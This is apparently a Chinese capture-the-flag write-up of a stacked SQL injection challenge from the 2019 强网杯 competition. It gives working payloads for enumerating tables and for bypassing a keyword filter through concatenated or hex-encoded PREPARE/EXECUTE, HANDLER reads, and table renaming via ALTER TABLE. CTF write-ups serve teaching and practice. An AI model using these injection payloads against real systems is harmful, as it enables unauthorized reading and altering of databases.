# [强网杯 2019]随便注


# [强网杯 2019]随便注

输入`1'`，页面报错

![ [强网杯 2019]随便注-1](https://pic.imgdb.cn/item/6536352ec458853aef2f3ff0.jpg)

输入`1'#`，页面恢复正常，说明存在sql注入点

![ [强网杯 2019]随便注-2](https://pic.imgdb.cn/item/65363575c458853aef2fe4b1.jpg)

输入`1'order by 2#`页面正常，输入`1'order by 3#`页面报错，说明有两个字段

![ [强网杯 2019]随便注-3](https://pic.imgdb.cn/item/6536367dc458853aef322f58.jpg)

输入`-1'union select 1,2#`，发现被过滤了

![ [强网杯 2019]随便注-4](https://pic.imgdb.cn/item/653637d1c458853aef35c5b4.jpg)

提示会过滤`select` `uodate` `delete` `drop` `insert` `where` `. ` (包括大小写)，因此**放弃联合注入和盲注**

输入`1';show databases;#`，成功回显了所有数据库名，说明**存在堆叠注入**

![ [强网杯 2019]随便注-5](https://pic.imgdb.cn/item/65363bacc458853aef3e59e5.jpg)

输入`1';show tables;#`，回显了两个表 `"1919810931114514"` 、 `"words"`

![ [强网杯 2019]随便注-6](https://pic.imgdb.cn/item/65363c0bc458853aef3f2421.jpg)

输入:

```sql
1';show columns from `1919810931114514`;#
```

或者:

```sql
1';desc `1919810931114514`;#
```

看到 `1919810931114514` 表中只有 `flag` 这一个字段

![ [强网杯 2019]随便注-7](https://pic.imgdb.cn/item/65363d4fc458853aef41fd58.jpg)

​	

​	

**如何获取到 "1919810931114514" 表里 "flag" 字段的值？**

**方法一：**

通过预编译来拼接 select

```sql
1';PREPARE inject from concat('se','lect', ' * from `1919810931114514` ');EXECUTE inject;#
```

- PREPARE inject from concat('se','lect', ' * from 1919810931114514 ')：创建一个名为inject的预处理语句，内容是拼接的字符串 'se' + 'lect' + ' * from 1919810931114514'。
- EXECUTE inject：执行inject预处理语句

或者这样：

```sql
1';SeT@a=concat('se','lect', ' * from `1919810931114514` ');PREPARE inject from @a;EXECUTE inject;#
```

这两条payload是一个意思

​	

**方法二：**

把查询语句 "select * from \`1919810931114514`" 转成16进制编码再配合预编译

```sql
1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE inject from @a;EXECUTE inject;#
```

或：

```sql
1';PREPARE inject from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE inject;#
```

- EXECUTE执行预处理语句时会解码

​	

**方法三：**

直接访问表的底层数据而不经过SQL查询

```sql
1';handler `1919810931114514` open as `inject`; handler `inject` read next;
```

- `handler 1919810931114514 open as a;` ：打开一个句柄（handler），将其命名为"inject"，并指向名为"1919810931114514"的表。可以通过句柄"inject"来直接访问表"1919810931114514"的数据。
- `handler a read next;` ：通过句柄"inject"执行了一个读取操作。从表"1919810931114514"中读取下一行数据。句柄可以绕过SQL查询，直接对表的底层数据进行读取操作。

​	

**方法四：**

让正常的查询变成往"1919810931114514"表里查询

正常的查询是从"words"表里查询的，通过`1';show columns from words;#`可以看到"words"表里有"id"字段和"data"字段

![ [强网杯 2019]随便注-8](https://pic.imgdb.cn/item/65365422c458853aef787233.jpg)

不难猜到后端的sql查询语句大致是`select * from words where id=$_GET['inject']`，我们只要把"words"表的名字改成其他的、把"1919810931114514"表的名字改成"words"、再往里添一个"id"字段，这样正常的查询就变成往以前的"1919810931114514"表里查询

```sql
1';rename table words to xxx; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key;#
```

- `rename table words to xxx;` ：将"words"表改名为"xxx"
- `rename table 1919810931114514 to words;` ：将"1919810931114514"表改名为"words"
- `alter table words add id int unsigned not Null auto_increment primary key;` ：在"words"表中添加"id"字段，数据类型为"int"、无符号整数(只能存储正数值)、非空(not Null)、自动递增(AUTO_INCREMENT)、将"id"字段设置为主键(PRIMARY KEY)，这将确保id列的唯一性，并加速表的查找操作。

改完后正常查询一个1就能看到flag

​	

​	

​	

**参考文章**

[[强网杯 2019]随便注 1【SQL注入】四种解法](https://zhuanlan.zhihu.com/p/545713669)
